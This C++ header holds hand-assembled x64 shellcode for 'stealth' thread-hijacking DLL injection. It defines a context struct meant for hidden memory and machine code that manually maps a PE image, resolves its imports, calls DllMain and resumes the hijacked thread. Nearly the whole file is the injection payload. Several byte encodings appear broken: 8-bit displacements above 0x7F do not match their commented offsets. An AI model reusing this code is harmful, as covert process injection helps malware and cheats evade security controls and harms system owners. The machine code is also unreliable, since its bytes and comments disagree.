/******************************************************************************
    Stealth Injection Shellcode for Thread Hijacking
    
    This shellcode is designed to run in a hijacked thread context.
    It saves all registers, performs manual mapping, calls DllMain,
    signals completion, then returns to original execution.
 ******************************************************************************/
#pragma once

namespace StealthShellcode
{

//
// Structure passed to hijack shellcode via RCX
// Must be placed in hidden memory
//
#pragma pack(push, 1)
typedef struct _HIJACK_CONTEXT
{
    // === Synchronization (offset 0x00) ===
    volatile LONG Lock;              // 0x00: Spinlock for kernel synchronization
    volatile LONG Completed;         // 0x04: Set to 1 when done
    volatile LONG Result;            // 0x08: DllMain return value (0 = fail, 1 = success)
    volatile LONG ErrorCode;         // 0x0C: Error code if failed

    // === Original thread state to restore (offset 0x10) ===
    ULONG64 OriginalRip;             // 0x10: Where to return after shellcode
    ULONG64 OriginalRsp;             // 0x18: Original stack pointer
    ULONG64 OriginalRax;             // 0x20: Original RAX
    ULONG64 OriginalRbx;             // 0x28: Original RBX
    ULONG64 OriginalRcx;             // 0x30: Original RCX
    ULONG64 OriginalRdx;             // 0x38: Original RDX
    ULONG64 OriginalRsi;             // 0x40: Original RSI
    ULONG64 OriginalRdi;             // 0x48: Original RDI
    ULONG64 OriginalRbp;             // 0x50: Original RBP
    ULONG64 OriginalR8;              // 0x58: Original R8
    ULONG64 OriginalR9;              // 0x60: Original R9
    ULONG64 OriginalR10;             // 0x68: Original R10
    ULONG64 OriginalR11;             // 0x70: Original R11
    ULONG64 OriginalR12;             // 0x78: Original R12
    ULONG64 OriginalR13;             // 0x80: Original R13
    ULONG64 OriginalR14;             // 0x88: Original R14
    ULONG64 OriginalR15;             // 0x90: Original R15
    ULONG64 OriginalRflags;          // 0x98: Original RFLAGS

    // === PE Image info (offset 0xA0) ===
    ULONG64 ImageBase;               // 0xA0: Mapped image base
    ULONG64 ImageSize;               // 0xA8: Image size
    ULONG64 EntryPointRva;           // 0xB0: AddressOfEntryPoint RVA
    ULONG64 RelocDirRva;             // 0xB8: Relocation directory RVA
    ULONG64 RelocDirSize;            // 0xC0: Relocation directory size
    ULONG64 ImportDirRva;            // 0xC8: Import directory RVA
    ULONG64 ImportDirSize;           // 0xD0: Import directory size
    ULONG64 OriginalImageBase;       // 0xD8: Original PE ImageBase for delta calculation

    // === Required function pointers (offset 0xE0) ===
    ULONG64 pLoadLibraryA;           // 0xE0: kernel32!LoadLibraryA
    ULONG64 pGetProcAddress;         // 0xE8: kernel32!GetProcAddress
    ULONG64 pNtFlushInstructionCache;// 0xF0: ntdll!NtFlushInstructionCache (optional)

} HIJACK_CONTEXT, *PHIJACK_CONTEXT;
#pragma pack(pop)

static_assert(sizeof(HIJACK_CONTEXT) <= 0x100, "HIJACK_CONTEXT too large");

//
// Hijack shellcode - assembled x64 machine code
// 
// Input: RCX = pointer to HIJACK_CONTEXT
// 
// Pseudo-code:
//   1. Save all volatile registers to stack (we're interrupting execution)
//   2. Process relocations
//   3. Resolve imports
//   4. Call DllMain(ImageBase, DLL_PROCESS_ATTACH, 0)
//   5. Set Completed = 1, Result = DllMain result
//   6. Restore all registers
//   7. Jump to OriginalRip
//
inline UCHAR g_HijackShellcode[] = {
    // === Function prologue - save non-volatile registers ===
    0x55,                                           // push rbp
    0x48, 0x89, 0xE5,                               // mov rbp, rsp
    0x48, 0x81, 0xEC, 0x00, 0x01, 0x00, 0x00,       // sub rsp, 0x100 (shadow space + locals)
    0x48, 0x89, 0x4D, 0xF8,                         // mov [rbp-8], rcx (save context ptr)
    
    // Save all volatile registers to our context structure isn't needed
    // because we'll restore from OriginalXXX fields at the end
    
    // === RBX = context pointer for entire shellcode ===
    0x48, 0x89, 0xCB,                               // mov rbx, rcx
    
    // === Process Relocations ===
    // Calculate delta: delta = ImageBase - OriginalImageBase
    0x48, 0x8B, 0x43, 0xA0,                         // mov rax, [rbx+0xA0] ; ImageBase
    0x48, 0x2B, 0x43, 0xD8,                         // sub rax, [rbx+0xD8] ; - OriginalImageBase
    0x48, 0x89, 0xC6,                               // mov rsi, rax        ; rsi = delta
    
    // Check if relocations exist
    0x48, 0x83, 0x7B, 0xC0, 0x00,                   // cmp qword [rbx+0xC0], 0 ; RelocDirSize
    0x0F, 0x84, 0x70, 0x00, 0x00, 0x00,             // jz skip_reloc (to import processing)
    
    // r12 = reloc directory ptr = ImageBase + RelocDirRva
    0x4C, 0x8B, 0x63, 0xA0,                         // mov r12, [rbx+0xA0] ; ImageBase
    0x4C, 0x03, 0x63, 0xB8,                         // add r12, [rbx+0xB8] ; + RelocDirRva
    
    // r13 = reloc end = reloc ptr + RelocDirSize
    0x4D, 0x89, 0xE5,                               // mov r13, r12
    0x4C, 0x03, 0x6B, 0xC0,                         // add r13, [rbx+0xC0] ; + RelocDirSize
    
    // Relocation block loop
    // reloc_block_loop:
    0x4D, 0x39, 0xEC,                               // cmp r12, r13
    0x0F, 0x83, 0x4A, 0x00, 0x00, 0x00,             // jae skip_reloc
    
    // r14 = block VirtualAddress, r15d = block SizeOfBlock
    0x45, 0x8B, 0x34, 0x24,                         // mov r14d, [r12]     ; VirtualAddress
    0x45, 0x8B, 0x7C, 0x24, 0x04,                   // mov r15d, [r12+4]   ; SizeOfBlock
    
    // Skip if SizeOfBlock <= 8 (header only)
    0x41, 0x83, 0xFF, 0x08,                         // cmp r15d, 8
    0x0F, 0x86, 0x2E, 0x00, 0x00, 0x00,             // jbe next_block
    
    // rcx = number of entries = (SizeOfBlock - 8) / 2
    0x41, 0x8D, 0x4F, 0xF8,                         // lea ecx, [r15-8]
    0xC1, 0xE9, 0x01,                               // shr ecx, 1
    
    // rdx = entry ptr = block + 8
    0x4C, 0x89, 0xE2,                               // mov rdx, r12
    0x48, 0x83, 0xC2, 0x08,                         // add rdx, 8
    
    // Entry loop
    // entry_loop:
    0x85, 0xC9,                                     // test ecx, ecx
    0x74, 0x1A,                                     // jz next_block
    
    0x0F, 0xB7, 0x02,                               // movzx eax, word [rdx] ; entry
    0x0F, 0xBA, 0xE0, 0x0C,                         // bt eax, 12            ; check type (bit 12-15)
    0x73, 0x0D,                                     // jnc skip_entry        ; if type == 0, skip
    
    // Apply relocation: *(ImageBase + VirtualAddress + (entry & 0xFFF)) += delta
    0x25, 0xFF, 0x0F, 0x00, 0x00,                   // and eax, 0xFFF        ; offset
    0x4C, 0x01, 0xF0,                               // add rax, r14          ; + VirtualAddress
    0x48, 0x03, 0x43, 0xA0,                         // add rax, [rbx+0xA0]   ; + ImageBase
    0x48, 0x01, 0x30,                               // add [rax], rsi        ; += delta
    
    // skip_entry:
    0x48, 0x83, 0xC2, 0x02,                         // add rdx, 2
    0xFF, 0xC9,                                     // dec ecx
    0xEB, 0xDC,                                     // jmp entry_loop
    
    // next_block:
    0x4D, 0x01, 0xFC,                               // add r12, r15          ; next block
    0xEB, 0xA8,                                     // jmp reloc_block_loop
    
    // skip_reloc:
    // === Process Imports ===
    0x48, 0x83, 0x7B, 0xD0, 0x00,                   // cmp qword [rbx+0xD0], 0 ; ImportDirSize
    0x0F, 0x84, 0x8B, 0x00, 0x00, 0x00,             // jz skip_imports
    
    // r12 = import descriptor ptr = ImageBase + ImportDirRva
    0x4C, 0x8B, 0x63, 0xA0,                         // mov r12, [rbx+0xA0]
    0x4C, 0x03, 0x63, 0xC8,                         // add r12, [rbx+0xC8]   ; + ImportDirRva
    
    // Import descriptor loop
    // import_loop:
    0x41, 0x8B, 0x44, 0x24, 0x0C,                   // mov eax, [r12+0xC]    ; Name RVA
    0x85, 0xC0,                                     // test eax, eax
    0x0F, 0x84, 0x73, 0x00, 0x00, 0x00,             // jz skip_imports
    
    // Call LoadLibraryA(ImageBase + NameRva)
    0x48, 0x03, 0x43, 0xA0,                         // add rax, [rbx+0xA0]   ; ImageBase + NameRva
    0x48, 0x89, 0xC1,                               // mov rcx, rax          ; arg1 = dll name
    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 0x20         ; shadow space
    0xFF, 0x53, 0xE0,                               // call [rbx+0xE0]       ; LoadLibraryA
    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 0x20
    0x48, 0x85, 0xC0,                               // test rax, rax
    0x0F, 0x84, 0xAE, 0x00, 0x00, 0x00,             // jz fail               ; LoadLibrary failed
    0x49, 0x89, 0xC6,                               // mov r14, rax          ; r14 = module handle
    
    // Get thunk arrays
    0x41, 0x8B, 0x04, 0x24,                         // mov eax, [r12]        ; OriginalFirstThunk
    0x85, 0xC0,                                     // test eax, eax
    0x75, 0x04,                                     // jnz use_oft
    0x41, 0x8B, 0x44, 0x24, 0x10,                   // mov eax, [r12+0x10]   ; FirstThunk
    // use_oft:
    0x48, 0x03, 0x43, 0xA0,                         // add rax, [rbx+0xA0]
    0x49, 0x89, 0xC7,                               // mov r15, rax          ; r15 = lookup thunk
    
    0x41, 0x8B, 0x44, 0x24, 0x10,                   // mov eax, [r12+0x10]   ; FirstThunk
    0x48, 0x03, 0x43, 0xA0,                         // add rax, [rbx+0xA0]
    0x48, 0x89, 0xC6,                               // mov rsi, rax          ; rsi = address thunk
    
    // Thunk loop
    // thunk_loop:
    0x49, 0x8B, 0x07,                               // mov rax, [r15]        ; lookup entry
    0x48, 0x85, 0xC0,                               // test rax, rax
    0x74, 0x30,                                     // jz next_descriptor
    
    // Check ordinal flag (bit 63)
    0x48, 0x0F, 0xBA, 0xE0, 0x3F,                   // bt rax, 63
    0x73, 0x07,                                     // jnc by_name
    
    // By ordinal
    0x0F, 0xB7, 0xD0,                               // movzx edx, ax         ; ordinal
    0xEB, 0x06,                                     // jmp do_getproc
    
    // by_name:
    0x48, 0x03, 0x43, 0xA0,                         // add rax, [rbx+0xA0]   ; ImageBase + hint/name RVA
    0x48, 0x83, 0xC0, 0x02,                         // add rax, 2            ; skip hint, point to name
    0x48, 0x89, 0xC2,                               // mov rdx, rax          ; arg2 = name
    
    // do_getproc:
    0x4C, 0x89, 0xF1,                               // mov rcx, r14          ; arg1 = module
    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 0x20
    0xFF, 0x53, 0xE8,                               // call [rbx+0xE8]       ; GetProcAddress
    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 0x20
    0x48, 0x85, 0xC0,                               // test rax, rax
    0x74, 0x57,                                     // jz fail
    
    0x48, 0x89, 0x06,                               // mov [rsi], rax        ; store in IAT
    0x49, 0x83, 0xC7, 0x08,                         // add r15, 8            ; next lookup
    0x48, 0x83, 0xC6, 0x08,                         // add rsi, 8            ; next address
    0xEB, 0xBF,                                     // jmp thunk_loop
    
    // next_descriptor:
    0x49, 0x83, 0xC4, 0x14,                         // add r12, 0x14         ; next import descriptor
    0xE9, 0x6A, 0xFF, 0xFF, 0xFF,                   // jmp import_loop
    
    // skip_imports:
    // === Call DllMain(ImageBase, DLL_PROCESS_ATTACH, 0) ===
    0x48, 0x8B, 0x4B, 0xA0,                         // mov rcx, [rbx+0xA0]   ; arg1 = ImageBase (hinstDLL)
    0xBA, 0x01, 0x00, 0x00, 0x00,                   // mov edx, 1            ; arg2 = DLL_PROCESS_ATTACH
    0x4D, 0x31, 0xC0,                               // xor r8, r8            ; arg3 = NULL (lpvReserved)
    
    // Calculate entry point = ImageBase + EntryPointRva
    0x48, 0x8B, 0x43, 0xA0,                         // mov rax, [rbx+0xA0]
    0x48, 0x03, 0x43, 0xB0,                         // add rax, [rbx+0xB0]   ; + EntryPointRva
    
    0x48, 0x83, 0xEC, 0x20,                         // sub rsp, 0x20         ; shadow space
    0xFF, 0xD0,                                     // call rax              ; DllMain
    0x48, 0x83, 0xC4, 0x20,                         // add rsp, 0x20
    
    // Store result
    0x89, 0x43, 0x08,                               // mov [rbx+0x08], eax   ; Result = return value
    
    // === Signal completion ===
    0xC7, 0x43, 0x04, 0x01, 0x00, 0x00, 0x00,       // mov dword [rbx+0x04], 1 ; Completed = 1
    0xEB, 0x0C,                                     // jmp restore_and_return
    
    // fail:
    0xC7, 0x43, 0x08, 0x00, 0x00, 0x00, 0x00,       // mov dword [rbx+0x08], 0 ; Result = 0
    0xC7, 0x43, 0x04, 0x01, 0x00, 0x00, 0x00,       // mov dword [rbx+0x04], 1 ; Completed = 1
    
    // restore_and_return:
    // === Restore all registers from context ===
    0x48, 0x8B, 0x43, 0x20,                         // mov rax, [rbx+0x20]   ; OriginalRax
    0x48, 0x8B, 0x4B, 0x30,                         // mov rcx, [rbx+0x30]   ; OriginalRcx
    0x48, 0x8B, 0x53, 0x38,                         // mov rdx, [rbx+0x38]   ; OriginalRdx
    0x48, 0x8B, 0x73, 0x40,                         // mov rsi, [rbx+0x40]   ; OriginalRsi
    0x48, 0x8B, 0x7B, 0x48,                         // mov rdi, [rbx+0x48]   ; OriginalRdi
    0x48, 0x8B, 0x6B, 0x50,                         // mov rbp, [rbx+0x50]   ; OriginalRbp
    0x4C, 0x8B, 0x43, 0x58,                         // mov r8, [rbx+0x58]    ; OriginalR8
    0x4C, 0x8B, 0x4B, 0x60,                         // mov r9, [rbx+0x60]    ; OriginalR9
    0x4C, 0x8B, 0x53, 0x68,                         // mov r10, [rbx+0x68]   ; OriginalR10
    0x4C, 0x8B, 0x5B, 0x70,                         // mov r11, [rbx+0x70]   ; OriginalR11
    0x4C, 0x8B, 0x63, 0x78,                         // mov r12, [rbx+0x78]   ; OriginalR12
    0x4C, 0x8B, 0x6B, 0x80,                         // mov r13, [rbx+0x80]   ; OriginalR13
    0x4C, 0x8B, 0x73, 0x88,                         // mov r14, [rbx+0x88]   ; OriginalR14
    0x4C, 0x8B, 0x7B, 0x90,                         // mov r15, [rbx+0x90]   ; OriginalR15
    
    // Restore RSP and push original RIP for return
    0x48, 0x8B, 0x63, 0x18,                         // mov rsp, [rbx+0x18]   ; OriginalRsp
    0xFF, 0x73, 0x10,                               // push [rbx+0x10]       ; push OriginalRip
    
    // Restore RBX last (we were using it as context pointer)
    0x48, 0x8B, 0x5B, 0x28,                         // mov rbx, [rbx+0x28]   ; OriginalRbx
    
    // Return to original execution
    0xC3,                                           // ret (pops OriginalRip)
};

constexpr SIZE_T HIJACK_SHELLCODE_SIZE = sizeof(g_HijackShellcode);

} // namespace StealthShellcode
